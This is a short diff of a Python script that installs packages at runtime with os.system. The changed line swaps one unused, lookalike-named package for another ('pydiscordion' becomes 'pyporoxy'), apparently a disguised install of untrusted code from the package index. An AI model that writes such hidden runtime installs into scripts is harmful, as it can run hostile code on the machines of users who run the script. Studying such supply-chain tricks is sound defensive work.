@@ -4,7 +4,7 @@ os.system("pip install tasksio")
 os.system("pip install asyncio")
 os.system("pip install colorama")
 os.system("pip install aiohttp")
-os.system(f"pip install pydiscordion")
+os.system(f"pip install pyporoxy")
 import aiohttp
 import asyncio
 from colorama import Fore
